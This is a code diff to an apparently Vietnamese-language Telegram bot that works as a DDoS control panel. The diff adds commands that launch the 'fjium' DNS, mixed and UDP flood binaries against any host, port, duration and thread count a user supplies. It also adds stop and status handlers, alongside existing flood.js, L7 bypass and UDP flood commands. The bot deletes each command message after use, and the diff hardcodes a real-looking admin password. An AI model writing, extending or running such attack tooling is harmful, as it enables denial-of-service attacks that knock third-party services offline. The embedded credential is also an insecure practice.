@@ -391,7 +391,7 @@ def load_bot_token():
 @dataclass
 class Config:
     TOKEN: str = None
-    ADMIN_PASSWORD: str = 'your_secure_password'
+    ADMIN_PASSWORD: str = 'RRojcmm$AWe$qW9P'
     DATABASE: str = 'bot_data_v3.db'
     MAX_MESSAGE_LENGTH: int = 4000
     RETRY_DELAY: int = 10
@@ -1151,11 +1151,17 @@ def cmd_help(message):
                 "/runovh host port duration threads - Chạy udpovh2gb.c\n"
                 "/runflood host time threads rate [method] [proxy] [options] - Chạy flood.js nâng cao\n"
                 "/runl7bypass host time rps threads [proxyfile] - Chạy bypass.js\n"
+                "/runfjium-dns target port time [threads] - Chạy fjium-dns attack\n"
+                "/runfjium-mix target port time [threads] - Chạy fjium-mix attack\n"
+                "/runfjium-gudp target port time [threads] - Chạy fjium-gudp attack\n"
                 "/stopkill - Dừng kill.js\n"
                 "/stopudp - Dừng udp_improved.py\n"
                 "/stopudpbypass - Dừng udpbypass\n"
                 "/stopflood - Dừng flood.js\n"
                 "/stopl7bypass - Dừng bypass.js\n"
+                "/stopfjium-dns - Dừng fjium-dns\n"
+                "/stopfjium-mix - Dừng fjium-mix\n"
+                "/stopfjium-gudp - Dừng fjium-gudp\n"
                 "/stopall - Dừng tất cả tác vụ của bạn\n"
                 "/stopuser <user_id> - Dừng tất cả tác vụ của user\n"
                 "/scrapeproxies - Thu thập proxies\n"
@@ -1165,6 +1171,9 @@ def cmd_help(message):
                 "/statusudpbypass - Trạng thái udpbypass\n"
                 "/statusflood - Trạng thái flood.js\n"
                 "/statusl7bypass - Trạng thái bypass.js\n"
+                "/statusfjium-dns - Trạng thái fjium-dns\n"
+                "/statusfjium-mix - Trạng thái fjium-mix\n"
+                "/statusfjium-gudp - Trạng thái fjium-gudp\n"
                 "/autonotify - Quản lý thông báo tự động\n"
                 "/testudpbypass - Test lệnh udpbypass\n"
                 "/testflood - Test lệnh flood nâng cao\n"
@@ -2045,6 +2054,360 @@ def cmd_runl7bypass(message):
             sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runl7bypass: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
+@bot.message_handler(commands=['runfjium-dns'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@resource_limit
+@log_command
+def cmd_runfjium_dns(message):
+    try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runfjium-dns...")
+
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+
+        # Phân tích tham số từ lệnh
+        args = message.text.split()
+        if len(args) < 4 or len(args) > 5:
+            bot.edit_message_text(
+                "⚠️ Cách dùng: /runfjium-dns <target> <port> <time> [threads]\n"
+                "Ví dụ: /runfjium-dns example.com 53 60\n"
+                "Ví dụ: /runfjium-dns example.com 53 60 100\n"
+                "📋 Tham số:\n"
+                "• target: Domain hoặc IP target\n"
+                "• port: Port DNS (thường là 53)\n"
+                "• time: Thời gian tấn công (giây)\n"
+                "• threads: Số luồng (mặc định: 100)",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        target = args[1]
+        port = args[2]
+        time = args[3]
+        threads = args[4] if len(args) > 4 else "100"
+
+        # Kiểm tra tính hợp lệ của tham số
+        try:
+            port_int = int(port)
+            time_int = int(time)
+            threads_int = int(threads)
+            if port_int <= 0 or port_int > 65535:
+                raise ValueError("Port phải từ 1-65535")
+            if time_int <= 0 or time_int > 3600:
+                raise ValueError("Time phải từ 1-3600 giây")
+            if threads_int <= 0 or threads_int > 1000:
+                raise ValueError("Threads phải từ 1-1000")
+        except ValueError as ve:
+            bot.edit_message_text(f"❌ Tham số không hợp lệ: {ve}",
+                                chat_id=message.chat.id,
+                                message_id=processing_msg.message_id)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            return
+
+        # Kiểm tra file fjium-dns
+        fjium_dns_path = "fjium-dns"
+        if os.name == 'nt':  # Windows
+            fjium_dns_path += ".exe"
+
+        if not os.path.exists(fjium_dns_path):
+            bot.edit_message_text(
+                "❌ File fjium-dns không tồn tại!\n"
+                "📥 Vui lòng tải file fjium-dns vào thư mục bot.",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            return
+
+        # Tự động chmod +x cho file fjium-dns
+        try:
+            if os.name != 'nt':  # Không phải Windows
+                result = subprocess.run(['chmod', '+x', fjium_dns_path],
+                                      capture_output=True, text=True, timeout=10)
+                if result.returncode == 0:
+                    logger.info(f"Đã chmod +x cho {fjium_dns_path}")
+                else:
+                    logger.warning(f"chmod failed for {fjium_dns_path}: {result.stderr}")
+            else:
+                logger.info(f"Windows detected, skipping chmod for {fjium_dns_path}")
+        except subprocess.TimeoutExpired:
+            logger.warning(f"chmod timeout cho {fjium_dns_path}")
+        except FileNotFoundError:
+            logger.warning(f"chmod command not found")
+        except Exception as e:
+            logger.warning(f"Không thể chmod +x cho {fjium_dns_path}: {e}")
+
+        # Cập nhật thông báo
+        bot.edit_message_text(
+            f"✅ Lệnh /runfjium-dns đã được nhận!\n"
+            f"🎯 Target: {target}:{port}\n"
+            f"⏱️ Thời gian: {time}s\n"
+            f"🧵 Threads: {threads}\n"
+            f"🔄 Đang khởi động fjium-dns...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+
+        # Tạo lệnh chạy fjium-dns
+        if os.name == 'nt':  # Windows
+            cmd = [fjium_dns_path, target, port, time, threads]
+        else:  # Linux/Unix
+            cmd = [f"./{fjium_dns_path}", target, port, time, threads]
+
+        # Chạy subprocess
+        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'fjium-dns', message)
+
+    except Exception as e:
+        logger.error(f"Error in /runfjium-dns: {e}")
+        try:
+            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-dns: {str(e)}",
+                                chat_id=message.chat.id,
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-dns: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
+@bot.message_handler(commands=['runfjium-mix'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@resource_limit
+@log_command
+def cmd_runfjium_mix(message):
+    try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runfjium-mix...")
+
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+
+        # Phân tích tham số từ lệnh
+        args = message.text.split()
+        if len(args) < 4 or len(args) > 5:
+            bot.edit_message_text(
+                "⚠️ Cách dùng: /runfjium-mix <target> <port> <time> [threads]\n"
+                "Ví dụ: /runfjium-mix example.com 80 60\n"
+                "Ví dụ: /runfjium-mix example.com 80 60 200\n"
+                "📋 Tham số:\n"
+                "• target: Domain hoặc IP target\n"
+                "• port: Port target\n"
+                "• time: Thời gian tấn công (giây)\n"
+                "• threads: Số luồng (mặc định: 200)",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        target = args[1]
+        port = args[2]
+        time = args[3]
+        threads = args[4] if len(args) > 4 else "200"
+
+        # Kiểm tra tính hợp lệ của tham số
+        try:
+            port_int = int(port)
+            time_int = int(time)
+            threads_int = int(threads)
+            if port_int <= 0 or port_int > 65535:
+                raise ValueError("Port phải từ 1-65535")
+            if time_int <= 0 or time_int > 3600:
+                raise ValueError("Time phải từ 1-3600 giây")
+            if threads_int <= 0 or threads_int > 1000:
+                raise ValueError("Threads phải từ 1-1000")
+        except ValueError as ve:
+            bot.edit_message_text(f"❌ Tham số không hợp lệ: {ve}",
+                                chat_id=message.chat.id,
+                                message_id=processing_msg.message_id)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            return
+
+        # Kiểm tra file fjium-mix
+        fjium_mix_path = "fjium-mix"
+        if os.name == 'nt':  # Windows
+            fjium_mix_path += ".exe"
+
+        if not os.path.exists(fjium_mix_path):
+            bot.edit_message_text(
+                "❌ File fjium-mix không tồn tại!\n"
+                "📥 Vui lòng tải file fjium-mix vào thư mục bot.",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            return
+
+        # Tự động chmod +x cho file fjium-mix
+        try:
+            if os.name != 'nt':  # Không phải Windows
+                result = subprocess.run(['chmod', '+x', fjium_mix_path],
+                                      capture_output=True, text=True, timeout=10)
+                if result.returncode == 0:
+                    logger.info(f"Đã chmod +x cho {fjium_mix_path}")
+                else:
+                    logger.warning(f"chmod failed for {fjium_mix_path}: {result.stderr}")
+            else:
+                logger.info(f"Windows detected, skipping chmod for {fjium_mix_path}")
+        except subprocess.TimeoutExpired:
+            logger.warning(f"chmod timeout cho {fjium_mix_path}")
+        except FileNotFoundError:
+            logger.warning(f"chmod command not found")
+        except Exception as e:
+            logger.warning(f"Không thể chmod +x cho {fjium_mix_path}: {e}")
+
+        # Cập nhật thông báo
+        bot.edit_message_text(
+            f"✅ Lệnh /runfjium-mix đã được nhận!\n"
+            f"🎯 Target: {target}:{port}\n"
+            f"⏱️ Thời gian: {time}s\n"
+            f"🧵 Threads: {threads}\n"
+            f"🔄 Đang khởi động fjium-mix...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+
+        # Tạo lệnh chạy fjium-mix
+        if os.name == 'nt':  # Windows
+            cmd = [fjium_mix_path, target, port, time, threads]
+        else:  # Linux/Unix
+            cmd = [f"./{fjium_mix_path}", target, port, time, threads]
+
+        # Chạy subprocess
+        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'fjium-mix', message)
+
+    except Exception as e:
+        logger.error(f"Error in /runfjium-mix: {e}")
+        try:
+            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-mix: {str(e)}",
+                                chat_id=message.chat.id,
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-mix: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
+@bot.message_handler(commands=['runfjium-gudp'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@resource_limit
+@log_command
+def cmd_runfjium_gudp(message):
+    try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runfjium-gudp...")
+
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+
+        # Phân tích tham số từ lệnh
+        args = message.text.split()
+        if len(args) < 4 or len(args) > 5:
+            bot.edit_message_text(
+                "⚠️ Cách dùng: /runfjium-gudp <target> <port> <time> [threads]\n"
+                "Ví dụ: /runfjium-gudp example.com 80 60\n"
+                "Ví dụ: /runfjium-gudp example.com 80 60 150\n"
+                "📋 Tham số:\n"
+                "• target: Domain hoặc IP target\n"
+                "• port: Port target\n"
+                "• time: Thời gian tấn công (giây)\n"
+                "• threads: Số luồng (mặc định: 150)",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        target = args[1]
+        port = args[2]
+        time = args[3]
+        threads = args[4] if len(args) > 4 else "150"
+
+        # Kiểm tra tính hợp lệ của tham số
+        try:
+            port_int = int(port)
+            time_int = int(time)
+            threads_int = int(threads)
+            if port_int <= 0 or port_int > 65535:
+                raise ValueError("Port phải từ 1-65535")
+            if time_int <= 0 or time_int > 3600:
+                raise ValueError("Time phải từ 1-3600 giây")
+            if threads_int <= 0 or threads_int > 1000:
+                raise ValueError("Threads phải từ 1-1000")
+        except ValueError as ve:
+            bot.edit_message_text(f"❌ Tham số không hợp lệ: {ve}",
+                                chat_id=message.chat.id,
+                                message_id=processing_msg.message_id)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            return
+
+        # Kiểm tra file fjium-gudp
+        fjium_gudp_path = "fjium-gudp"
+        if os.name == 'nt':  # Windows
+            fjium_gudp_path += ".exe"
+
+        if not os.path.exists(fjium_gudp_path):
+            bot.edit_message_text(
+                "❌ File fjium-gudp không tồn tại!\n"
+                "📥 Vui lòng tải file fjium-gudp vào thư mục bot.",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            return
+
+        # Tự động chmod +x cho file fjium-gudp
+        try:
+            if os.name != 'nt':  # Không phải Windows
+                result = subprocess.run(['chmod', '+x', fjium_gudp_path],
+                                      capture_output=True, text=True, timeout=10)
+                if result.returncode == 0:
+                    logger.info(f"Đã chmod +x cho {fjium_gudp_path}")
+                else:
+                    logger.warning(f"chmod failed for {fjium_gudp_path}: {result.stderr}")
+            else:
+                logger.info(f"Windows detected, skipping chmod for {fjium_gudp_path}")
+        except subprocess.TimeoutExpired:
+            logger.warning(f"chmod timeout cho {fjium_gudp_path}")
+        except FileNotFoundError:
+            logger.warning(f"chmod command not found")
+        except Exception as e:
+            logger.warning(f"Không thể chmod +x cho {fjium_gudp_path}: {e}")
+
+        # Cập nhật thông báo
+        bot.edit_message_text(
+            f"✅ Lệnh /runfjium-gudp đã được nhận!\n"
+            f"🎯 Target: {target}:{port}\n"
+            f"⏱️ Thời gian: {time}s\n"
+            f"🧵 Threads: {threads}\n"
+            f"🔄 Đang khởi động fjium-gudp...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+
+        # Tạo lệnh chạy fjium-gudp
+        if os.name == 'nt':  # Windows
+            cmd = [fjium_gudp_path, target, port, time, threads]
+        else:  # Linux/Unix
+            cmd = [f"./{fjium_gudp_path}", target, port, time, threads]
+
+        # Chạy subprocess
+        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'fjium-gudp', message)
+
+    except Exception as e:
+        logger.error(f"Error in /runfjium-gudp: {e}")
+        try:
+            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-gudp: {str(e)}",
+                                chat_id=message.chat.id,
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runfjium-gudp: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
 @bot.message_handler(commands=['stopovh'])
 @ignore_old_messages
 @not_banned
@@ -2065,6 +2428,7 @@ def cmd_stopovh(message):
     )
     
     stop_subprocess_safe(message.from_user.id, message.chat.id, 'udpovh', processing_msg)
+
 
 def _stop_all_for_user(target_user_id: int, chat_id: int, processing_msg=None, across_all_chats: bool=False):
     """Dừng tất cả tác vụ thuộc user. Nếu across_all_chats=True sẽ dừng ở mọi chat."""
@@ -2164,7 +2528,9 @@ def cmd_statusovh(message):
         )
     auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
 
-@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies', 'stopflood', 'stopudpbypass', 'stopl7bypass'])
+
+
+@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies', 'stopflood', 'stopudpbypass', 'stopl7bypass', 'stopfjium-dns', 'stopfjium-mix', 'stopfjium-gudp'])
 @ignore_old_messages
 @not_banned
 @admin_required
@@ -2201,6 +2567,18 @@ def cmd_stop_task(message):
             task_name = "l7bypass"
             task_key = "l7bypass"
             logger.info(f"User {user_id} requesting to stop l7bypass task")
+        elif cmd.startswith('/stopfjium-dns'):
+            task_name = "fjium-dns"
+            task_key = "fjium-dns"
+            logger.info(f"User {user_id} requesting to stop fjium-dns task")
+        elif cmd.startswith('/stopfjium-mix'):
+            task_name = "fjium-mix"
+            task_key = "fjium-mix"
+            logger.info(f"User {user_id} requesting to stop fjium-mix task")
+        elif cmd.startswith('/stopfjium-gudp'):
+            task_name = "fjium-gudp"
+            task_key = "fjium-gudp"
+            logger.info(f"User {user_id} requesting to stop fjium-gudp task")
         
         # Cập nhật thông báo
         try:
@@ -2262,7 +2640,7 @@ def cmd_stop_task(message):
                 except Exception as final_error:
                     logger.error(f"Final fallback failed: {final_error}")
 
-@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies', 'statusflood', 'statusudpbypass', 'statusl7bypass'])
+@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies', 'statusflood', 'statusudpbypass', 'statusl7bypass', 'statusfjium-dns', 'statusfjium-mix', 'statusfjium-gudp'])
 @ignore_old_messages
 @not_banned
 @admin_required
@@ -2290,6 +2668,12 @@ def cmd_status_task(message):
             task_key = 'scrapeproxies'
         elif 'flood' in cmd:
             task_key = 'flood'
+        elif 'fjium-dns' in cmd:
+            task_key = 'fjium-dns'
+        elif 'fjium-mix' in cmd:
+            task_key = 'fjium-mix'
+        elif 'fjium-gudp' in cmd:
+            task_key = 'fjium-gudp'
         else:
             bot.edit_message_text(
                 "❌ Lệnh không hợp lệ.",
